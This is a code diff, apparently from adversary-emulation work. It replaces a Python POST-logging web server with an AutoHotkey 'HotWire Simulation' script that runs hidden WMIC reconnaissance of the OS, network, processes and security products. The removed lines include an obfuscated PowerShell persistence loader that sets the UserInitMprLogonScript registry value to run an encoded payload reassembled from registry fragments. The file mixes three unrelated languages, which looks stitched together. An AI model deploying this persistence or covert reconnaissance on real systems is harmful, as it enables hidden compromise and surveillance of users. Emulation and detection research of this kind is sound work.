@@ -1,44 +1,44 @@
-import http.server
-import socketserver
 
-PORT = 8080
-hostName = "localhost"
+#NoEnv
+#SingleInstance Force
+#Persistent
 
-class MyServer(http.server.BaseHTTPRequestHandler):
-    def do_POST(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        
-        # Read the request body
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length)
-        
-        # Write response
-        self.wfile.write(bytes("<html><head><title>POST Response</title></head>", "utf-8"))
-        self.wfile.write(bytes("<body>", "utf-8"))
-        self.wfile.write(bytes("<p>Request: %s</p>" % post_data, "utf-8"))
-        self.wfile.write(bytes("<p>This is an example web server.</p>", "utf-8"))
-        self.wfile.write(bytes("</body></html>", "utf-8"))
-        
-        # Print to console
-        print(f"Server received POST request at {self.path}")
-        print(f"Data received: {post_data}")
+LogFile := "simulation_log.txt"
 
-if __name__ == "__main__":
-    webServer = socketserver.TCPServer((hostName, PORT), MyServer)
-    print(f"Server started http://{hostName}:{PORT}")
-    
-    try:
-        webServer.serve_forever()
-    except KeyboardInterrupt:
-        pass
-    
-    webServer.server_close()
-    print("Server stopped.")
+; Function to execute WMIC commands and append results to log
+RunWmicCommand(cmd) {
+    RunWait, %comspec% /c wmic %cmd% >> %LogFile% 2>&1, , Hide
+    FileAppend, `n--- %cmd% executed at %A_Now% ---`n, %LogFile%
+}
 
+; Collect Operating System information
+RunWmicCommand("os get Caption, Version, BuildNumber, InstallDate")
 
+; Collect Logical Disk information
+RunWmicCommand("logicaldisk get DeviceID, FileSystem, FreeSpace")
 
-$envRegPath = "HKCU:\Environment"
-$loaderCommand = '$frag1=[Get-ItemProperty -Path HKCU:\Cursors -Name nLzTvI0bImeIeqyxHxTJ]."nLzTvI0bImeIeqyxHxTJ"; $frag2=[Get-ItemProperty -Path HKCU:\Cursors -Name pQzUwJ1cKnfLerzxGyUK]."pQzUwJ1cKnfLerzxGyUK"; $frag3=[Get-ItemProperty -Path HKCU:\Cursors -Name rMxVwL2dMogPfsayIzVL]."rMxVwL2dMogPfsayIzVL"; $encoded=$frag1 + $frag2 + $frag3; powershell.exe -enc $encoded'
-Set-ItemProperty -Path $envRegPath -Name "UserInitMprLogonScript" -Value $loaderCommand
+; Collect Processor information
+RunWmicCommand("cpu get Name, MaxClockSpeed, NumberOfCores, Architecture")
+
+; Collect Video Controller information
+RunWmicCommand("path Win32_VideoController get Name, AdapterRAM, DriverVersion")
+
+; Collect Network Adapter Configuration
+RunWmicCommand("nicconfig where IPEnabled=true get IPAddress, DefaultIPGateway, DNSServerSearchOrder")
+
+; Collect Firewall Product information
+RunWmicCommand("product where \"Name like '%firewall%'\" get Name, Version, Status")
+
+; Collect AntiSpyware Product information
+RunWmicCommand("product where \"Name like '%antispyware%'\" get Name, Version, Status")
+
+; Collect Process information with executable path
+RunWmicCommand("process where \"ExecutablePath is not null\" get Name, ExecutablePath, ProcessID")
+
+; Simulate C2 transmission by logging completion
+FileAppend, WMI queries completed and data logged at %A_Now%`n, %LogFile%
+
+TrayTip, HotWire Simulation, WMI queries executed. Check %LogFile%.
+
+; Keep script running
+Return
